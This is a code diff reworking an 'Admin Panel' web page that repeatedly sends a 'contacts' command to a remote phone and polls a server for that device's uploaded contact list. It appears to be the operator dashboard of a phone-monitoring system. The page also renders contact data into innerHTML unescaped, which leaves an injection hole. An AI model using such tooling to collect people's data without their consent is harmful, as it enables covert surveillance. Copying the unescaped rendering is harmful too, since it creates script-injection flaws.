@@ -3,326 +3,266 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contacts</title>
+    <title>Contacts - Admin Panel</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
             --bg-color: #000000;
+            --card-bg: #1c1c1e;
             --text-main: #ffffff;
-            --text-sub: #8e8e93;
-            --search-bg: #1c1c1e;
-            --separator: #38383a;
-            --blue-accent: #0a84ff;
+            --text-muted: #8e8e93;
+            --border-color: #38383a;
+            --accent-green: #30d158;
+            --blue-accent: #0b84ff;
         }
 
         body {
             background-color: var(--bg-color);
             color: var(--text-main);
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             margin: 0; padding: 0;
             display: flex; justify-content: center;
-            min-height: 100vh;
         }
 
         .container {
-            width: 100%; max-width: 480px;
+            width: 100%; max-width: 500px;
             background: #000;
-            display: flex; flex-direction: column;
-            position: relative;
             min-height: 100vh;
+            padding-bottom: 20px;
         }
 
-        /* --- HEADER --- */
+        /* --- Header --- */
         .header {
-            display: flex; justify-content: space-between; align-items: center;
-            padding: 15px 20px;
-            background: rgba(20, 20, 20, 0.95);
-            position: sticky; top: 0; z-index: 100;
+            position: sticky; top: 0;
+            background: rgba(0, 0, 0, 0.95);
             backdrop-filter: blur(10px);
-            border-bottom: 0.5px solid var(--separator);
+            z-index: 100;
+            padding: 15px;
+            border-bottom: 0.5px solid var(--border-color);
         }
+
+        .top-row {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .page-title { font-size: 1.5rem; font-weight: 700; }
+        
+        .live-indicator {
+            font-size: 0.75rem; color: var(--accent-green);
+            display: flex; align-items: center; gap: 5px;
+            background: rgba(48, 209, 88, 0.15);
+            padding: 4px 10px; border-radius: 20px;
+            font-weight: 600;
+        }
+
+        .blink { animation: blinker 1.5s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0.4; } }
 
         .back-btn {
-            color: var(--blue-accent); font-size: 1.2rem;
-            text-decoration: none; width: 30px; height: 30px;
-            display: flex; align-items: center; justify-content: center;
+            color: var(--blue-accent); font-size: 1rem; text-decoration: none;
+            display: flex; align-items: center; gap: 5px;
         }
 
-        .page-title { font-size: 1.1rem; font-weight: 600; }
-
-        .refresh-btn {
-            background: transparent; border: none;
-            color: var(--blue-accent); font-size: 1.1rem; 
-            cursor: pointer; padding: 0;
-        }
-
-        /* --- STATUS BAR --- */
-        .status-bar {
-            background: #222; color: #ff9f0a;
-            font-size: 0.75rem; text-align: center; padding: 4px;
-            display: none; /* Hidden by default */
-        }
-
-        /* --- SEARCH BAR --- */
-        .search-container {
-            padding: 10px 15px;
-            background: #000;
-            position: sticky; top: 60px; z-index: 90;
-        }
-
-        .search-box {
-            background: var(--search-bg);
-            border-radius: 10px;
-            display: flex; align-items: center;
-            padding: 8px 12px;
-        }
-
-        .search-icon { color: var(--text-sub); margin-right: 8px; font-size: 0.9rem; }
-
+        /* --- Search --- */
+        .search-box { position: relative; margin-top: 5px; }
+        
         .search-input {
-            background: transparent; border: none; outline: none;
-            color: var(--text-main); width: 100%; font-size: 1rem;
+            width: 100%;
+            background: #1c1c1e; /* Match iOS search bar */
+            border: none;
+            padding: 10px 35px;
+            border-radius: 10px;
+            color: white;
+            font-size: 1rem;
+            box-sizing: border-box;
+            outline: none;
+        }
+        .search-icon {
+            position: absolute; left: 12px; top: 50%; transform: translateY(-50%);
+            color: var(--text-muted); font-size: 0.9rem;
+        }
+
+        /* --- Contact List --- */
+        .contact-list {
+            display: flex; flex-direction: column;
+            padding: 0 15px;
+        }
+
+        .contact-card {
+            background: var(--card-bg);
+            padding: 15px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
         
-        /* --- CONTACT LIST --- */
-        .contact-list { 
-            display: flex; flex-direction: column; 
-            padding-bottom: 50px;
-        }
+        .contact-card:first-child { border-top-left-radius: 12px; border-top-right-radius: 12px; }
+        .contact-card:last-child { border-bottom-left-radius: 12px; border-bottom-right-radius: 12px; border-bottom: none; }
 
-        .contact-row {
-            display: flex; align-items: center;
-            padding: 12px 20px;
-            border-bottom: 0.5px solid var(--separator);
-        }
-
-        .contact-row.hidden { display: none !important; }
-
-        .avatar {
-            width: 40px; height: 40px;
-            background: #2c2c2e;
-            color: #fff;
-            border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            font-weight: 600; font-size: 1.1rem;
-            margin-right: 15px; flex-shrink: 0;
-        }
-
-        .info { flex: 1; overflow: hidden; }
+        .contact-info { display: flex; flex-direction: column; gap: 4px; }
         
-        .name { 
-            font-size: 1rem; font-weight: 600; color: #fff;
-            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
-        }
-        
-        .number { font-size: 0.85rem; color: var(--text-sub); margin-top: 2px; }
+        .contact-name { font-size: 1rem; font-weight: 600; color: #fff; }
+        .contact-number { font-size: 0.85rem; color: var(--text-muted); }
 
-        .call-action {
-            width: 35px; height: 35px;
-            display: flex; align-items: center; justify-content: center;
-            color: var(--blue-accent); font-size: 1.1rem;
-            text-decoration: none; margin-left: 10px;
-            background: rgba(10, 132, 255, 0.1); border-radius: 50%;
+        .action-btn {
+            color: var(--blue-accent);
+            font-size: 1.2rem;
+            padding: 10px;
+            text-decoration: none;
         }
 
-        .empty-msg { text-align: center; color: var(--text-sub); margin-top: 50px; }
-        .error-msg { text-align: center; color: #ff453a; margin-top: 50px; }
+        .status-msg { text-align: center; color: var(--text-muted); margin-top: 50px; font-size: 0.9rem; }
     </style>
 </head>
 <body>
 
     <div class="container">
         <div class="header">
-            <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
-            <span class="page-title">Contacts <span id="count" style="font-size: 0.8rem; color: gray"></span></span>
-            <button onclick="manualRefresh()" class="refresh-btn" id="refreshBtn">
-                <i class="fa-solid fa-rotate"></i>
-            </button>
-        </div>
-
-        <div id="statusBar" class="status-bar">Connecting...</div>
-
-        <div class="search-container">
+            <div class="top-row">
+                <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i> Back</a>
+                <span class="page-title">Contacts</span>
+                <div class="live-indicator"><i class="fa-solid fa-circle blink"></i> Live</div>
+            </div>
+            
             <div class="search-box">
                 <i class="fa-solid fa-magnifying-glass search-icon"></i>
-                <input type="text" id="searchInput" class="search-input" placeholder="Search" onkeyup="filterContacts()">
+                <input type="text" id="searchInput" class="search-input" placeholder="Search name or number..." onkeyup="filterContacts()">
             </div>
         </div>
 
-        <div class="contact-list" id="contactsContainer">
-            <div class="empty-msg">
+        <div id="contact-list" class="contact-list">
+            <div class="status-msg">
                 <i class="fa-solid fa-spinner fa-spin"></i><br><br>Loading Contacts...
             </div>
         </div>
     </div>
 
-    <script>
-        const SERVER_URL = "https://child-v9no.onrender.com";
-        const urlParams = new URLSearchParams(window.location.search);
-        
-        const DEVICE_ID = urlParams.get('id') ? urlParams.get('id').toUpperCase() : null;
-        const storageKey = `contacts_${DEVICE_ID}`;
-        
-        let allContactsData = []; 
+<script>
+    const SERVER_URL = "https://child-v9no.onrender.com";
+    const urlParams = new URLSearchParams(window.location.search);
+    const DEVICE_ID = urlParams.get('id') ? urlParams.get('id').toUpperCase() : null;
+    const storageKeyContacts = `contacts_${DEVICE_ID}`;
 
-        document.addEventListener("DOMContentLoaded", () => {
-            if (!DEVICE_ID) {
-                document.getElementById("contactsContainer").innerHTML = '<div class="error-msg">Error: Device ID Missing</div>';
-                return;
-            }
-            
-            // 1. Load cached data first (Fast UI)
-            loadFromStorage();
-            
-            // 2. Fetch fresh data
-            fetchData();
-        });
+    let allContacts = [];
+    let isFetching = false;
 
-        function showStatus(msg) {
-            const el = document.getElementById("statusBar");
-            el.style.display = 'block';
-            el.innerText = msg;
+    document.addEventListener("DOMContentLoaded", function() {
+        if (!DEVICE_ID) {
+            document.getElementById("contact-list").innerHTML = '<div class="status-msg" style="color:red">Error: No Device ID Found</div>';
+            return;
         }
 
-        function loadFromStorage() {
+        // Load cached data first
+        const savedData = localStorage.getItem(storageKeyContacts);
+        if (savedData) {
             try {
-                const saved = localStorage.getItem(storageKey);
-                if (saved) {
-                    const parsed = JSON.parse(saved);
-                    if (Array.isArray(parsed) && parsed.length > 0) {
-                        allContactsData = parsed;
-                        renderContacts(allContactsData);
-                        showStatus("Loaded from Cache");
-                    }
-                }
-            } catch(e) { console.error(e); }
+                allContacts = JSON.parse(savedData);
+                renderContacts(allContacts);
+            } catch(e) {}
         }
 
-        function manualRefresh() {
-            const icon = document.querySelector('#refreshBtn i');
-            icon.classList.add('fa-spin');
-            showStatus("Sending Command...");
+        startLiveSystem();
+    });
 
-            // Send command request
-            fetch(`${SERVER_URL}/api/send-command`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ device_id: DEVICE_ID, command: 'contacts' })
+    function startLiveSystem() {
+        sendCommand(); // Ask phone to update contacts
+        fetchContacts(); // Fetch from server
+        
+        // Contacts don't change often, so we update slower
+        setInterval(sendCommand, 20000); 
+        setInterval(fetchContacts, 5000);
+    }
+
+    function sendCommand() {
+        fetch(`${SERVER_URL}/api/send-command`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ device_id: DEVICE_ID, command: 'contacts' }) // Command 'contacts' check karein
+        }).catch(e => console.log("Command error:", e));
+    }
+
+    function fetchContacts() {
+        if(isFetching) return;
+        isFetching = true;
+
+        // URL check: Ensure endpoint is correct (/contacts)
+        fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/contacts?t=${Date.now()}`)
+            .then(res => {
+                if(!res.ok) throw new Error("Server Error: " + res.status);
+                return res.json();
             })
-            .then(() => {
-                showStatus("Waiting for device...");
-                setTimeout(() => {
-                    fetchData(true);
-                }, 4000);
-            })
-            .catch(() => {
-                showStatus("Command Failed");
-                icon.classList.remove('fa-spin');
-            });
-        }
-
-        function fetchData(isManual = false) {
-            showStatus("Fetching Data...");
-            const apiURL = `${SERVER_URL}/api/get-data/${DEVICE_ID}/contacts?t=${Date.now()}`;
-            
-            fetch(apiURL)
-                .then(res => res.json())
-                .then(data => {
-                    const icon = document.querySelector('#refreshBtn i');
-                    icon.classList.remove('fa-spin');
-
-                    if (!data || !Array.isArray(data) || data.length === 0) {
-                        showStatus("No Data Received");
-                        if(allContactsData.length === 0) {
-                             document.getElementById("contactsContainer").innerHTML = '<div class="empty-msg">No contacts found on device yet.<br>Click refresh to try again.</div>';
-                        }
-                        return;
+            .then(data => {
+                if (data && Array.isArray(data) && data.length > 0) {
+                    // Check if data changed
+                    if (JSON.stringify(data) !== JSON.stringify(allContacts)) {
+                        allContacts = data.sort((a, b) => (a.name || "").localeCompare(b.name || ""));
+                        localStorage.setItem(storageKeyContacts, JSON.stringify(allContacts));
+                        
+                        const query = document.getElementById('searchInput').value;
+                        if(query === "") renderContacts(allContacts);
+                        else filterContacts();
                     }
-
-                    // Data received
-                    allContactsData = data;
-                    localStorage.setItem(storageKey, JSON.stringify(data));
-                    renderContacts(data);
-                    showStatus("Updated Just Now");
-                    
-                    // Hide status bar after 3 seconds if successful
-                    setTimeout(() => { document.getElementById("statusBar").style.display = 'none'; }, 3000);
-                })
-                .catch(err => {
-                    console.error("Error fetching", err);
-                    document.querySelector('#refreshBtn i').classList.remove('fa-spin');
-                    showStatus("Connection Failed");
-                    
-                    // If screen is still loading (no cache), show error
-                    if(allContactsData.length === 0) {
-                        document.getElementById("contactsContainer").innerHTML = '<div class="error-msg">Connection Error.<br>Check Server URL.</div>';
-                    }
-                });
-        }
-
-        function renderContacts(data) {
-            const container = document.getElementById("contactsContainer");
-            
-            // Safety Check
-            if (!Array.isArray(data)) {
-                container.innerHTML = `<div class="error-msg">Invalid Data Format</div>`;
-                return;
-            }
-
-            // Update Count
-            document.getElementById("count").innerText = `(${data.length})`;
-
-            // Sort Alphabetically (Handle emoji/special chars safely)
-            data.sort((a, b) => {
-                const nameA = (a.name || "").toString().toLowerCase();
-                const nameB = (b.name || "").toString().toLowerCase();
-                return nameA.localeCompare(nameB);
-            });
-
-            // Build HTML
-            const html = data.map(contact => {
-                const name = contact.name ? String(contact.name) : "Unknown";
-                const num = contact.number || contact.phone || "";
-                
-                // Get First Letter safely
-                let firstLetter = "?";
-                if(name && name.length > 0) {
-                    firstLetter = Array.from(name)[0].toUpperCase(); // Array.from handles Emojis better
+                } else if (!allContacts.length) {
+                    document.getElementById("contact-list").innerHTML = '<div class="status-msg">No contacts found on device.</div>';
                 }
+            })
+            .catch(err => {
+                console.error("Fetch Error:", err);
+                if(allContacts.length === 0) {
+                    document.getElementById("contact-list").innerHTML = `<div class="status-msg" style="color:red">Connection Failed.<br><small>${err.message}</small></div>`;
+                }
+            })
+            .finally(() => { isFetching = false; });
+    }
 
-                // Sanitize for search (prevent crash on quotes)
-                const searchString = (name + " " + num).toLowerCase().replace(/"/g, "&quot;");
+    function filterContacts() {
+        const query = document.getElementById('searchInput').value.toLowerCase();
+        const filtered = allContacts.filter(c => {
+            const name = String(c.name || "").toLowerCase();
+            const num = String(c.number || "").toLowerCase();
+            return name.includes(query) || num.includes(query);
+        });
+        renderContacts(filtered);
+    }
 
-                return `
-                    <div class="contact-row" data-search="${searchString}">
-                        <div class="avatar">${firstLetter}</div>
-                        <div class="info">
-                            <div class="name">${name}</div>
-                            <div class="number">${num}</div>
+    function renderContacts(data) {
+        const listContainer = document.getElementById("contact-list");
+        
+        if (!data || data.length === 0) {
+            listContainer.innerHTML = '<div class="status-msg">No contacts found.</div>';
+            return;
+        }
+
+        // Prevent heavy rendering
+        const displayData = data.slice(0, 200);
+
+        const htmlString = displayData.map(c => {
+            const name = c.name || "Unknown";
+            const number = c.number || "";
+            
+            // Generate Avatar Initials
+            const initial = name.charAt(0).toUpperCase();
+
+            return `
+                <div class="contact-card">
+                    <div style="display:flex; align-items:center; gap:12px;">
+                        <div style="width:40px; height:40px; background:#333; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:bold; color:#fff;">
+                            ${initial}
                         </div>
-                        <a href="tel:${num}" class="call-action">
-                            <i class="fa-solid fa-phone"></i>
-                        </a>
-                    </div>`;
-            }).join('');
+                        <div class="contact-info">
+                            <span class="contact-name">${name}</span>
+                            <span class="contact-number">${number}</span>
+                        </div>
+                    </div>
+                    <a href="tel:${number}" class="action-btn"><i class="fa-solid fa-phone"></i></a>
+                </div>
+            `;
+        }).join('');
 
-            container.innerHTML = html;
-        }
-
-        function filterContacts() {
-            const query = document.getElementById('searchInput').value.toLowerCase();
-            const rows = document.querySelectorAll('.contact-row');
-            
-            rows.forEach(row => {
-                const searchData = row.getAttribute('data-search');
-                // Check if searchData exists before checking includes
-                if (searchData && searchData.includes(query)) {
-                    row.classList.remove('hidden');
-                } else {
-                    row.classList.add('hidden');
-                }
-            });
-        }
-    </script>
+        listContainer.innerHTML = htmlString;
+    }
+</script>
 </body>
 </html>
